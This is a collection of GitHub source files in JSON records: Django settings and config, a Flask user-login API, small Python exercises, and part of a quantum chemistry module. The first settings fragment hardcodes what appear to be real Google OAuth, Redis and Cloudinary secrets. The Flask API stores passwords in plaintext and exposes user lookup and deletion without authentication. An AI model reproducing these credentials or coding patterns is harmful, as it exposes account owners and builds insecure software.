Key\nSOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = 'ySLD3I7esB-SjOJaQzqtat_Q' # Google Consumer Secret\n\nREDIS_HOST = 'ec2-54-197-124-167.compute-1.amazonaws.com'\nREDIS_PORT =  25580\nREDIS_PASSWORD = 'pa1f0a5e4291cc48d7081c8a5195ab2ece84789299ebc80e35fe49c3df8cb99b2'\nREDIS_USER = 'h'\n\n# Internationalization\n# https://docs.djangoproject.com/en/3.0/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'Asia/Tehran'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/3.0/howto/static-files/\n\nSTATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')\nSTATIC_URL = '/static/'\n\nSTATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'\n\nLOGIN_REDIRECT_URL = 'dashboard'\n\nLOGIN_URL = 'login'\nLOGOUT_URL = 'logout'\n\nCLOUDINARY_STORAGE = {\n    'CLOUD_NAME': 'dt0x3ff8y',\n    'API_KEY': '842463339847471',\n    'API_SECRET': 'd4CUuUKhO4JSVfy9DA41a4KhGGw',\n}\nDEFAULT_FILE_STORAGE = 'cloudinary_storage.storage.MediaCloudinaryStorage'\n\nMEDIA_URL = '/media/'\nMEDIA_ROOT = os.path.join(BASE_DIR, 'media/')\n\nEMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'"}
{"blob_id": "6f67cc655e1362623e70664f2a8af3a5acedff21", "directory_id": "c2218d1559054c0117e92285c8751d6741d73e6d", "path": "/webpushproject/asgi.py", "content_id": "8e7d2fe44fd2bd0e02731a7561c1853ae93c4c00", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Kevin-Ravasco/Webpush-Notifications", "snapshot_id": "847638a054bfc2b34586bc4c4b3db41eb43d6aaf", "revision_id": "0c6f62f907148f1a849e8f17fb93b0a9cd81dd97", "branch_name": "refs/heads/master", "visit_date": "2023-03-08 06:15:50.720626", "revision_date": "2021-02-18 07:51:31", "committer_date": "2021-02-18 07:51:31", "github_id": "339973034", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "405", "extension": "py", "content": "\"\"\"\nASGI config for webpushproject project.\n\nIt exposes the ASGI callable as a module-level variable named ``application``.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.1/howto/deployment/asgi/\n\"\"\"\n\nimport os\n\nfrom django.core.asgi import get_asgi_application\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'webpushproject.settings')\n\napplication = get_asgi_application()\n"}
{"blob_id": "e5f070db22a8850db0b45ffa4f7225d2d8b63760", "directory_id": "5b37f26057918c5048c4d35d60442133ea8700dd", "path": "/007_Inferential_Statistics/python_program_for_binomial.py", "content_id": "b3c279edd6b1efd7941de4ac216e33c15b6ef2cb", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "venkatpselvam1/DataScience", "snapshot_id": "543ac587f7864c3d3ad662fdb83777cc39f32572", "revision_id": "65201025ef53071d2e628418ee55d0f807c251c2", "branch_name": "refs/heads/main", "visit_date": "2023-07-20 21:14:07.052918", "revision_date": "2021-09-05 08:48:27", "committer_date": "2021-09-05 08:48:27", "github_id": "354520238", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "477", "extension": "py", "content": "x=float(input())#number of applicants\nm=int(input())#probability of accepting an application\nn=int(input())#find the probability that at most n applications are accepted\ndef nCr(n, r):\n    return (fact(n) / (fact(r)\n                * fact(n - r)))\n# Returns factorial of n\ndef fact(n):\n    res = 1\n    for i in range(2, n+1):\n        res = res * i\n    return res\nans = 0.0\nfor i in range(n+1):\n    nc = nCr(m,i)\n    ans+= nc * (x ** (i)) * ((1-x) ** (m-i))\nprint(round(ans,4))\n"}
{"blob_id": "66df50561912de7fd11745c25bd1bd3516af22b9", "directory_id": "d64d5dbb6aab8e3e81f87a632faebb5031f1c2c9", "path": "/btre/urls.py", "content_id": "a268cfe6358ad85827596961dd7b809ed96c8bd0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "foktafiizex/btre_project", "snapshot_id": "6309dc517f025473d0fe42fd7f26c97d9e2a1b6d", "revision_id": "411355e72957e85d783c159f1991045210cfdbdb", "branch_name": "refs/heads/main", "visit_date": "2023-04-01 22:04:07.362211", "revision_date": "2021-04-10 19:02:27", "committer_date": "2021-04-10 19:02:27", "github_id": "356667582", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1078", "extension": "py", "content": "\"\"\"btre URL Configuration\n\nThe `urlpatterns` list routes URLs to views. For more information please see:\n    https://docs.djangoproject.com/en/3.1/topics/http/urls/\nExamples:\nFunction views\n    1. Add an import:  from my_app import views\n    2. Add a URL to urlpatterns:  path('', views.home, name='home')\nClass-based views\n    1. Add an import:  from other_app.views import Home\n    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')\nIncluding another URLconf\n    1. Import the include() function: from django.urls import include, path\n    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))\n\"\"\"\nfrom django.contrib import admin\nfrom django.urls import path, include\nfrom django.conf import settings\nfrom django.conf.urls.static import static\n\nurlpatterns = [\n    path('', include('pages.urls')),\n    path('listings/', include('listings.urls')),\n    path('accounts/', include('accounts.urls')),\n    path('contacts/', include('contacts.urls')),\n    path('admin/', admin.site.urls)\n] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\n"}
{"blob_id": "df05bece6f596e42f9622a7db7425fd74a02516e", "directory_id": "41e365c16286cf6bb043f8dc56f87b2d13ff1535", "path": "/resources/user.py", "content_id": "871cf8ee996c27aa0c3912d9db33be07ae103190", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "LA-Hacks/CoronaCare-API", "snapshot_id": "c980f43c3cfd3a1a25c3bd58171481d70390d8e8", "revision_id": "abf9fa515df5c68dca92b13d75a1e3daea04b99d", "branch_name": "refs/heads/master", "visit_date": "2022-12-11 10:33:53.963376", "revision_date": "2020-03-29 16:25:30", "committer_date": "2020-03-29 16:25:30", "github_id": "250720077", "star_events_count": "2", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2022-12-08 03:55:11", "gha_created_at": "2020-03-28 05:16:51", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5868", "extension": "py", "content": "from flask_restful import Resource, reqparse\nfrom werkzeug.security import safe_str_cmp\nfrom bson import json_util\nfrom bson.objectid import ObjectId\nfrom flask_jwt_extended import (\n    create_access_token,\n    create_refresh_token,\n    jwt_refresh_token_required,\n    get_jwt_identity,\n    jwt_required,\n    get_raw_jwt,\n)\nfrom blacklist import BLACKLIST\n\nfrom db import mongo\n\n_user_parser = reqparse.RequestParser()\n_user_parser.add_argument(\n    \"username\", type=str, required=True, help=\"This field cannot be blank.\"\n)\n_user_parser.add_argument(\n    \"password\", type=str, required=True, help=\"This field cannot be blank.\"\n)\n_user_parser.add_argument(\n    \"phone_number\", type=str, required=True, help=\"This field cannot be blank.\"\n)\n# Hospital Name or Provider Name needs to be required in production\n_user_parser.add_argument(\n    \"hospital_id\", type=str, required=False, help=\"This field cannot be blank.\"\n)\n_user_parser.add_argument(\n    \"provider_id\", type=str, required=False, help=\"This field cannot be blank.\"\n)\n\n\n_login_parser = reqparse.RequestParser()\n_login_parser.add_argument(\n    \"username\", type=str, required=True, help=\"This field cannot be blank.\"\n)\n_login_parser.add_argument(\n    \"password\", type=str, required=True, help=\"This field cannot be blank.\"\n)\n\n\nclass UserRegister(Resource):\n\n    def post(self):\n        # call the parser on the body of the request and store dict of args in data\n        data = _user_parser.parse_args()\n\n        # search to make sure that another user with the same username does not exist\n        try:\n            # look for first document in users collection to have a username data['username']\n            user = mongo.db.users.find_one({\"username\": data[\"username\"]})\n        except:\n            return {\"message\": \"An error occurred looking up the user\"}, 500\n\n        if user:\n            return {\"message\": \"A user with that username already exists\"}, 400\n\n        try:\n            # insert document into users collection\n            mongo.db.users.insert_one({\n                \"username\": data[\"username\"],\n                \"password\": data[\"password\"],\n                \"hospital_id\": data.get(\"hospital_id\"),\n                \"provider_id\": data.get(\"provider_id\"),\n                \"phone_number\": data.get(\"phone_number\")\n            })\n\n            return {\"message\": \"User created successfully.\"}, 201\n        except:\n            return {\"message\": \"An error occurred creating the user\"}, 500\n\n\nclass User(Resource):\n\n    @classmethod\n    def get(cls, username):\n        try:\n            # look for first document in users collection to have a username equal to ata['username']\n            user = mongo.db.users.find_one({\"username\": username})\n        except:\n            return {\"message\": \"An error occurred looking up the user\"}, 500\n\n        if user:\n            # return user converted to json\n            return json_util._json_convert(user), 200\n        return {\"message\": \"user not found\"}, 404\n\n    @classmethod\n    def delete(cls, username):\n        try:\n            # look for first document in users collection to have a username data['username']\n            user = mongo.db.users.find_one({\"username\": username})\n        except:\n            return {\"message\": \"An error occurred trying to look up this user\"}, 500\n\n        if user:\n            try:\n                # delete first document in users collection to have a username equal to  username\n                mongo.db.users.delete_one({\"username\": username})\n            except:\n                return {\"message\": \"An error occurred trying to delete this user\"}, 500\n            return {\"message\": \"User was deleted\"}, 200\n        return {\"message\": \"User not found\"}, 404\n\n\nclass UserLogin(Resource):\n    def post(self):\n        # call the parser on the body of the request and store dict of args in data\n        data = _login_parser.parse_args()\n\n        try:\n            # look for first document in users collection to have a username data['username']\n            user = mongo.db.users.find_one({\"username\": data[\"username\"]})\n        except:\n            return {\"message\": \"An error occurred trying to look up this user\"}, 500\n\n        # safe_str_cmp checks to make passwords match\n        if user and safe_str_cmp(user[\"password\"], data[\"password\"]):\n            # create new fresh access token that binds to the identity of the user (users.get(\"_id\"))\n            # identity=str(user.get(\"_id\")) is what makes get_jwt_identity() in todo.py return the object id of the user\n            access_token = create_access_token(\n                identity=str(user.get(\"_id\")), fresh=True\n            )\n            # create new refresh token that binds to the identity of the user (users.get(\"_id\"))\n            refresh_token = create_refresh_token(str(user.get(\"_id\")))\n\n            _type = \"provider\"\n            if user.get(\"hospital_id\"):\n                _type = \"hospital\"\n\n            return {\"access_token\": access_token, \"type\": _type, \"refresh_token\": refresh_token}, 200\n\n        return {\"message\": \"Invalid Credentials!\"}, 401\n\n\nclass UserLogout(Resource):\n    # requires the client making the HTTP request to have a valid access\n    @jwt_required\n    def post(self):\n        # jti is \"JWT ID\", a unique identifier for a JWT.\n        jti = get_raw_jwt()[\"jti\"]\n        BLACKLIST.add(jti)\n        return {\"message\": \"Successfully logged out\"}, 200\n\n\nclass TokenRefresh(Resource):\n    # requires the client making the HTTP request to have a refresh_token they received when they logged in\n    @jwt_refresh_token_required\n    def post(self):\n        # gets the users identity which is their object id in mongo\n        current_user = get_jwt_identity()\n        # create a new access token that is not fresh\n        new_token = create_access_token(identity=current_user, fresh=False)\n        return {\"access_token\": new_token}, 200\n"}
{"blob_id": "edc988f9c15c43102072817f4dfaacb87a384e42", "directory_id": "133f92990646be34059a3b22b4e046d5433801a9", "path": "/mysiteProject/settings.py", "content_id": "d2dc7edfcf3da28a7bc652c42b041d5b2493ff0d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ridham6299/project1", "snapshot_id": "72bea9aa476e433560c9750f534583b37e13da22", "revision_id": "dd226975c26834febce1ef7e2721b1878136aae1", "branch_name": "refs/heads/master", "visit_date": "2023-02-23 00:17:33.071422", "revision_date": "2021-01-28 11:25:00", "committer_date": "2021-01-28 11:25:00", "github_id": "333632225", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3126", "extension": "py", "content": "\"\"\"\nDjango settings for mysiteProject project.\n\nGenerated by 'django-admin startproject' using Django 3.1.4.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/3.1/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/3.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'p5zt+&sxkntydmxqvgj89uv=jb+jr3o*ie5@@tnq98at+dr&jv'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'main.apps.MainConfig',\n    'tinymce',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'mysiteProject.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'mysiteProject.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/3.1/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/3.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/3.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/3.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n"}
{"blob_id": "2921acb69e3c4da295a0e5f0841dfa9b32a3e11e", "directory_id": "df0cf939996cfcdc5dcfb3af2b533e629ce1a606", "path": "/ex2.py", "content_id": "dc1bcc05e3bdd596e4956e9da610da1ee81f2d19", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "CheshireCat12/pythonExercices", "snapshot_id": "c6ecc6b04cd3d4da08c92afbde9ee4f9b7cc6d6c", "revision_id": "808ffef4343af0cf18704af2bb94f5537696828f", "branch_name": "refs/heads/master", "visit_date": "2021-01-20 00:41:03.374918", "revision_date": "2017-05-09 20:03:36", "committer_date": "2017-05-09 20:03:36", "github_id": "89170592", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "993", "extension": "py", "content": "func = lambda x:x*53\nfor val in map(func,range(10)):\n    print(val)\n\nA0 = dict(zip((\"a\",\"b\",\"c\",\"d\",\"e\"),(1,2,\"er\",4,5)))\nprint(A0)\nA1 = [i for i in range(10)]\nprint(A1)\nfor indice, value in enumerate(A1):\n    print(\"{0} poss\u00e8de la valeur : {1}\".format(indice,value))\n\nfor value in A0:\n    print(\"{0} poss\u00e8de la valeur : {1}\".format(value,A0[value]))\n\nA2 = range(10)\nprint(A2)\n\n\nfor s in A0:\n    print(s)\n\nA5 = {i:i*i for i in A1}\nprint(A5)\n\nA6 = zip((1, 2, 3, 4), ('a', 'b', 'c', 'd'))\n\nA7, A8= zip(*A6)\nprint(A7, A8)\n\ndef f(x,l=[]):\n    for i in range(x):\n        l.append(i*i)\n    print(l)\n\nf(2)\nf(3,[3,2,1])\nf(3)\n\n\n\n\nfor i in range(len(carte)):\n    tempNow = list(carte[i])\n    print(tempNow)\n    if i-1<0:\n        tempLast = [0,0]\n    else:\n        tempLast = list(carte[i-1])\n    if tempNow[0] != tempLast[0] or change:\n        count += int(\"\".join(tempNow[1:]))\n        change = False\n    else:\n        count -= int(\"\".join(tempNow[1:]))\n        change = True\n        print(\"change\")\n"}
{"blob_id": "0b9f5be3481aff742b7992a617ddf67ee11b028a", "directory_id": "6e356282a1bb292049580cbcf63c6f6065a66aab", "path": "/src/tequila/quantumchemistry/qc_base.py", "content_id": "c2d0fb8d96e6ab4afe3b706072c4112dee174da1", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "Zombor00/tequila", "snapshot_id": "c28dc293929ba07a38f7b0db36f37bbf908d0134", "revision_id": "8a8d1b595155fe4e104a330e4ae61da39d83171a", "branch_name": "refs/heads/master", "visit_date": "2023-08-11 13:23:49.595527", "revision_date": "2021-08-04 20:25:54", "committer_date": "2021-08-04 20:25:54", "github_id": "374626429", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2021-08-12 22:25:33", "gha_created_at": "2021-06-07 10:33:28", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "80699", "extension": "py", "content": "from dataclasses import dataclass\nfrom tequila import TequilaException, BitString, TequilaWarning\nfrom tequila.hamiltonian import QubitHamiltonian\nfrom tequila.wavefunction import QubitWaveFunction\nfrom tequila.hamiltonian.paulis import Sp, Sm, Qp, Qm\n\nfrom tequila.circuit import QCircuit, gates, _gates_impl\nfrom tequila.objective.objective import Variable, Variables, ExpectationValue\n\nfrom tequila.simulators.simulator_api import simulate\nfrom tequila.utils import to_float\n\nfrom tequila.objective import assign_variable\n\nfrom .encodings import known_encodings\n\nimport typing, numpy, numbers, copy\nfrom itertools import product\n\n# if you are experiencing import errors you need to update openfermion\n# required is version >= 1.0\n# otherwise replace with from openfermion.hamiltonians import MolecularData\nimport openfermion\nfrom openfermion.chem import MolecularData\n\nimport warnings\n\n\n@dataclass\nclass ActiveSpaceData:\n    active_orbitals: list  # active orbitals (spatial, c1)\n    reference_orbitals: list  # reference orbitals (spatial, c1)\n\n    def __str__(self):\n        result = \"Active Space Data:\\n\"\n        result += \"{key:15} : {value:15} \\n\".format(key=\"active_orbitals\", value=str(self.active_orbitals))\n        result += \"{key:15} : {value:15} \\n\".format(key=\"reference_orbitals\",\n                                                    value=str(self.reference_orbitals))\n        result += \"{key:15} : {value:15} \\n\".format(key=\"frozen_docc\", value=str(self.frozen_docc))\n        result += \"{key:15} : {value:15} \\n\".format(key=\"frozen_uocc\", value=str(self.frozen_uocc))\n        return result\n\n    @property\n    def frozen_reference_orbitals(self):\n        return [i for i in self.reference_orbitals if i not in self.active_orbitals]\n\n    @property\n    def active_reference_orbitals(self):\n        return [i for i in self.reference_orbitals if i in self.active_orbitals]\n\n\nclass FermionicGateImpl(gates.QubitExcitationImpl):\n    # keep the overview in circuits\n    def __init__(self, generator, p0, transformation,  *args, **kwargs):\n        super().__init__(generator=generator, target=generator.qubits, p0=p0, *args, **kwargs)\n        self._name = \"FermionicExcitation\"\n        self.transformation=transformation\n\n    def compile(self):\n        return gates.Trotterized(generator=self.generator, control=self.control, angle=self.parameter, steps=1)\n\ndef prepare_product_state(state: BitString) -> QCircuit:\n    \"\"\"Small convenience function\n\n    Parameters\n    ----------\n    state :\n        product state encoded into a bitstring\n    state: BitString :\n\n\n    Returns\n    -------\n    type\n        unitary circuit which prepares the product state\n\n    \"\"\"\n    result = QCircuit()\n    for i, v in enumerate(state.array):\n        if v == 1:\n            result += gates.X(target=i)\n    return result\n\n\n@dataclass\nclass ParametersQC:\n    \"\"\"Specialization of ParametersHamiltonian\"\"\"\n    basis_set: str = ''  # Quantum chemistry basis set\n    geometry: str = ''  # geometry of the underlying molecule (units: Angstrom!),\n    # this can be a filename leading to an .xyz file or the geometry given as a string\n    description: str = ''\n    multiplicity: int = 1\n    charge: int = 0\n    closed_shell: bool = True\n    name: str = \"molecule\"\n\n    @property\n    def filename(self):\n        \"\"\" \"\"\"\n        return \"{}_{}\".format(self.name, self.basis_set)\n\n    @property\n    def molecular_data_param(self) -> dict:\n        \"\"\":return: Give back all parameters for the MolecularData format from openfermion as dictionary\"\"\"\n        return {'basis': self.basis_set, 'geometry': self.get_geometry(), 'description': self.description,\n                'charge': self.charge, 'multiplicity': self.multiplicity, 'filename': self.filename\n                }\n\n    @staticmethod\n    def format_element_name(string):\n        \"\"\"OpenFermion uses case sensitive hash tables for chemical elements\n        I.e. you need to name Lithium: 'Li' and 'li' or 'LI' will not work\n        this convenience function does the naming\n        :return: first letter converted to upper rest to lower\n\n        Parameters\n        ----------\n        string :\n\n\n        Returns\n        -------\n\n        \"\"\"\n        assert (len(string) > 0)\n        assert (isinstance(string, str))\n        fstring = string[0].upper() + string[1:].lower()\n        return fstring\n\n    @staticmethod\n    def convert_to_list(geometry):\n        \"\"\"Convert a molecular structure given as a string into a list suitable for openfermion\n\n        Parameters\n        ----------\n        geometry :\n            a string specifying a mol. structure. E.g. geometry=\"h 0.0 0.0 0.0\\n h 0.0 0.0 1.0\"\n\n        Returns\n        -------\n        type\n            A list with the correct format for openfermion E.g return [ ['h',[0.0,0.0,0.0], [..]]\n\n        \"\"\"\n        result = []\n        for line in geometry.split('\\n'):\n            words = line.split()\n            if len(words) != 4:  break\n            try:\n                tmp = (ParametersQC.format_element_name(words[0]),\n                       (float(words[1]), float(words[2]), float(words[3])))\n                result.append(tmp)\n            except ValueError:\n                print(\"get_geometry list unknown line:\\n \", line, \"\\n proceed with caution!\")\n        return result\n\n    def get_geometry_string(self) -> str:\n        \"\"\"returns the geometry as a string\n        :return: geometry string\n\n        Parameters\n        ----------\n\n        Returns\n        -------\n\n        \"\"\"\n        if self.geometry.split('.')[-1] == 'xyz':\n            geomstring, comment = self.read_xyz_from_file(self.geometry)\n            if comment is not None:\n                self.description = comment\n            return geomstring\n        else:\n            return self.geometry\n\n    def get_geometry(self):\n        \"\"\"Returns the geometry\n        If a xyz filename was given the file is read out\n        otherwise it is assumed that the geometry was given as string\n        which is then reformatted as a list usable as input for openfermion\n        :return: geometry as list\n        e.g. [(h,(0.0,0.0,0.35)),(h,(0.0,0.0,-0.35))]\n        Units: Angstrom!\n\n        Parameters\n        ----------\n\n        Returns\n        -------\n\n        \"\"\"\n        if self.geometry.split('.')[-1] == 'xyz':\n            geomstring, comment = self.read_xyz_from_file(self.geometry)\n            if self.description == '':\n                self.description = comment\n            if self.name == \"molecule\":\n                self.name = self.geometry.split('.')[0]\n            return self.convert_to_list(geomstring)\n        elif self.geometry is not None:\n            return self.convert_to_list(self.geometry)\n        else:\n            raise Exception(\"Parameters.qc.geometry is None\")\n\n    @staticmethod\n    def read_xyz_from_file(filename):\n        \"\"\"Read XYZ filetype for molecular structures\n        https://en.wikipedia.org/wiki/XYZ_file_format\n        Units: Angstrom!\n\n        Parameters\n        ----------\n        filename :\n            return:\n\n        Returns\n        -------\n\n        \"\"\"\n        with open(filename, 'r') as file:\n            content = file.readlines()\n            natoms = int(content[0])\n            comment = str(content[1]).strip('\\n')\n            coord = ''\n            for i in range(natoms):\n                coord += content[2 + i]\n            return coord, comment\n\n\n@dataclass\nclass ClosedShellAmplitudes:\n    \"\"\" \"\"\"\n    tIjAb: numpy.ndarray = None\n    tIA: numpy.ndarray = None\n\n    def make_parameter_dictionary(self, threshold=1.e-8):\n        \"\"\"\n\n        Parameters\n        ----------\n        threshold :\n             (Default value = 1.e-8)\n\n        Returns\n        -------\n\n        \"\"\"\n        variables = {}\n        if self.tIjAb is not None:\n            nvirt = self.tIjAb.shape[2]\n            nocc = self.tIjAb.shape[0]\n            assert (self.tIjAb.shape[1] == nocc and self.tIjAb.shape[3] == nvirt)\n            for (I, J, A, B), value in numpy.ndenumerate(self.tIjAb):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(nocc + A, I, nocc + B, J)] = value\n        if self.tIA is not None:\n            nocc = self.tIA.shape[0]\n            for (I, A), value, in numpy.ndenumerate(self.tIA):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(A + nocc, I)] = value\n\n        return dict(sorted(variables.items(), key=lambda x: numpy.abs(x[1]), reverse=True))\n\n\n@dataclass\nclass Amplitudes:\n    \"\"\"Coupled-Cluster Amplitudes\n    We adopt the Psi4 notation for consistency\n    I,A for alpha\n    i,a for beta\n\n    Parameters\n    ----------\n\n    Returns\n    -------\n\n    \"\"\"\n\n    @classmethod\n    def from_closed_shell(cls, cs: ClosedShellAmplitudes):\n        \"\"\"\n        Initialize from closed-shell Amplitude structure\n\n        Parameters\n        ----------\n        cs: ClosedShellAmplitudes :\n\n\n        Returns\n        -------\n\n        \"\"\"\n        tijab = cs.tIjAb - numpy.einsum(\"ijab -> ijba\", cs.tIjAb, optimize='greedy')\n        return cls(tIjAb=cs.tIjAb, tIA=cs.tIA, tiJaB=cs.tIjAb, tia=cs.tIA, tijab=tijab, tIJAB=tijab)\n\n    tIjAb: numpy.ndarray = None\n    tIA: numpy.ndarray = None\n    tiJaB: numpy.ndarray = None\n    tijab: numpy.ndarray = None\n    tIJAB: numpy.ndarray = None\n    tia: numpy.ndarray = None\n\n    def make_parameter_dictionary(self, threshold=1.e-8):\n        \"\"\"\n\n        Parameters\n        ----------\n        threshold :\n             (Default value = 1.e-8)\n             Neglect amplitudes below the threshold\n\n        Returns\n        -------\n        Dictionary of tequila variables (hash is in the style of (a,i,b,j))\n\n        \"\"\"\n        variables = {}\n        if self.tIjAb is not None:\n            nvirt = self.tIjAb.shape[2]\n            nocc = self.tIjAb.shape[0]\n            assert (self.tIjAb.shape[1] == nocc and self.tIjAb.shape[3] == nvirt)\n\n            for (I, j, A, b), value in numpy.ndenumerate(self.tIjAb):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (nocc + A), 2 * I, 2 * (nocc + b) + 1, j + 1)] = value\n            for (i, J, a, B), value in numpy.ndenumerate(self.tiJaB):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (nocc + a) + 1, 2 * i + 1, 2 * (nocc + B), J)] = value\n            for (i, j, a, b), value in numpy.ndenumerate(self.tijab):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (nocc + a) + 1, 2 * i + 1, 2 * (nocc + b) + 1, j + 1)] = value\n            for (I, J, A, B), value in numpy.ndenumerate(self.tijab):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (nocc + A), 2 * I, 2 * (nocc + B), J)] = value\n\n        if self.tIA is not None:\n            nocc = self.tIjAb.shape[0]\n            assert (self.tia.shape[0] == nocc)\n            for (I, A), value, in numpy.ndenumerate(self.tIA):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (A + nocc), 2 * I)] = value\n            for (i, a), value, in numpy.ndenumerate(self.tIA):\n                if not numpy.isclose(value, 0.0, atol=threshold):\n                    variables[(2 * (a + nocc) + 1, 2 * i + 1)] = value\n\n        return variables\n\n\nclass NBodyTensor:\n    \"\"\" Convenience class for handling N-body tensors \"\"\"\n\n    class Ordering:\n        def __init__(self, scheme):\n            if hasattr(scheme, \"_scheme\"):\n                scheme = scheme._scheme\n            elif hasattr(scheme, \"scheme\"):\n                scheme = scheme.scheme\n            self._scheme = self.assign_scheme(scheme)\n\n        def assign_scheme(self, scheme):\n            if scheme is None:\n                return \"chem\"\n            else:\n                scheme = str(scheme)\n\n            if scheme.lower() in [\"mulliken\", \"chem\", \"c\", \"1122\"]:\n                return \"chem\"\n            elif scheme.lower() in [\"dirac\", \"phys\", \"p\", \"1212\"]:\n                return \"phys\"\n            elif scheme.lower() in [\"openfermion\", \"of\", \"o\", \"1221\"]:\n                return \"of\"\n            else:\n                raise TequilaException(\n                    \"Unknown two-body tensor scheme {}. Supported are dirac, mulliken, and openfermion\".format(scheme))\n\n        def is_phys(self):\n            return self._scheme == \"phys\"\n\n        def is_chem(self):\n            return self._scheme == \"chem\"\n\n        def is_of(self):\n            return self._scheme == \"of\"\n\n    def __init__(self, elems: numpy.ndarray = None, active_indices: list = None, ordering: str = None,\n                 size_full: int = None):\n        \"\"\"\n        Parameters\n        ----------\n        elems: Tensor data as numpy array\n        active_indices: List of active indices in total ordering\n        ordering: Ordering scheme for two body tensors\n        \"dirac\" or \"phys\": <12|g|12>\n            .. math::\n                g_{pqrs} = \\\\int d1 d2 p(1)q(2) g(1,2) r(1)s(2)\n        \"mulliken\" or \"chem\": (11|g|22)\n            .. math::\n                